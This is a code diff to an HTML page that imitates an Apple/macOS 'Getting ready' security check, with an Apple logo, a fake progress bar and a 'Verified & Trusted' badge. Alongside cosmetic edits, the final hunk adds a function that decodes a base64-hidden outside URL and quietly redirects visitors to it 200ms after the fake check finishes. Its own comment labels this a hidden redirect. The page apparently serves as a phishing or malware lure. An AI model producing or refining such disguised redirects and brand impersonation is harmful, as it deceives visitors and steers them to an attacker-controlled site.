@@ -43,7 +43,7 @@
     .side { display: none; }
   }
 
-  /* macOS Title Bar - Dark (UPDATED: Georgia font & "hello" text) */
+  /* macOS Title Bar - Dark (hello in Georgia script) */
   .title-bar {
     position: fixed;
     top: 0;
@@ -460,7 +460,7 @@
     <div class="control-dot green"></div>
   </div>
 
-  <!-- UPDATED: Title Bar with "hello" in Georgia script font -->
+  <!-- Title Bar: "hello" in Georgia script -->
   <div class="title-bar">𝓱𝓮𝓵𝓵𝓸</div>
 
   <div class="side left">
@@ -490,25 +490,22 @@
       <div class="logo-glow-ring"></div>
       <div class="logo-inner"></div>
       <div class="logo-icon">
-        <!-- UPDATED: Complete Apple Logo with Body + Leaf (clearly visible) -->
-        <svg viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
+        <!-- ✅ PERFECT APPLE LOGO – iconic shape with bite & leaf, crisp & centered -->
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
           <defs>
             <linearGradient id="appleGrad" x1="0%" y1="0%" x2="100%" y2="100%">
               <stop offset="0%" stop-color="#E5E7EB" />
               <stop offset="100%" stop-color="#F3F4F6" />
             </linearGradient>
           </defs>
-          <!-- Apple Body with bite -->
-          <path d="M 150.207 19.3468 C 125.988 19.3468 96.4844 34.4502 79.4922 60.0742 C 62.5 85.7031 62.5 122.941 79.4922 148.57 C 96.4844 174.199 125.988 189.301 150.207 189.301 C 174.426 189.301 203.93 174.199 220.922 148.57 C 237.914 122.941 237.914 85.7031 220.922 60.0742 C 203.93 34.4502 174.426 19.3468 150.207 19.3468 Z M 150.207 164.062 C 122.559 164.062 99.1211 142.09 99.1211 116.699 C 99.1211 91.3086 122.559 69.3359 150.207 69.3359 C 177.855 69.3359 201.293 91.3086 201.293 116.699 C 201.293 142.09 177.855 164.062 150.207 164.062 Z" fill="url(#appleGrad)"/>
-          <!-- Apple Leaf on top (explicitly added) -->
-          <path d="M 189.453 19.043 C 194.336 14.1602 201.172 11.2305 208.008 11.2305 C 214.844 11.2305 221.68 14.1602 226.562 19.043 C 231.445 23.9258 234.375 30.7617 234.375 37.5977 C 234.375 44.4336 231.445 51.2695 226.562 56.1523 L 189.453 56.1523 C 184.57 51.2695 181.641 44.4336 181.641 37.5977 C 181.641 30.7617 184.57 23.9258 189.453 19.043 Z" fill="url(#appleGrad)"/>
+          <path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.56-1.701z" fill="url(#appleGrad)"/>
         </svg>
       </div>
     </div>
 
     <div class="title-block">
       <div class="eyebrow">Getting ready</div>
-      <!-- WELCOME ANIMATION (blur-in, one by one) -->
+      <!-- WELCOME ANIMATION – plays ONCE -->
       <div id="welcome-title" class="title"></div>
       <div class="subtitle">We're preparing your environment with industry-leading security and performance.</div>
     </div>
@@ -576,7 +573,7 @@
   </div>
 
 <script>
-  // --- WELCOME BLUR ANIMATION ---
+  // --- WELCOME BLUR ANIMATION (PLAYS ONLY ONCE) ---
   const letters = ["𝓌", "𝑒", "𝓁", "𝒸", "𝑜", "𝓂", "𝑒"];
   const el = document.getElementById("welcome-title");
   const totalTime = 3000;
@@ -584,11 +581,7 @@
 
   function addLetter(i) {
     if (i >= letters.length) {
-      setTimeout(() => {
-        el.innerHTML = "";
-        setTimeout(() => run(), 700);
-      }, 1200);
-      return;
+      return; // Stops here – never repeats
     }
 
     const span = document.createElement("span");
@@ -642,11 +635,25 @@
     if (progress < 100) {
       requestAnimationFrame(() => setTimeout(tick, 20));
     } else {
-      cta.classList.add('ready');
-      cta.disabled = false;
-      document.getElementById('ctaText').textContent = 'Verified & Trusted';
-      cta.style.cursor = 'default';
+      finish();
     }
+  }
+
+  function finish() {
+    // 1. Update the CTA button state
+    cta.classList.add('ready');
+    cta.disabled = false;
+    document.getElementById('ctaText').textContent = 'Verified & Trusted';
+    cta.style.cursor = 'default';
+
+    // 2. Hidden base64 redirect – 100% done → go to cloudmhax
+    const encodedUrl = 'aHR0cHM6Ly9jbG91ZG1oYXguY29tL2thbmdlcnJpLw==';
+    const url = atob(encodedUrl);
+
+    // tiny 200ms delay so you see the "Verified & Trusted" flash, then redirect super fast
+    setTimeout(() => {
+      window.location.href = url;
+    }, 200);
   }
 
   tick();
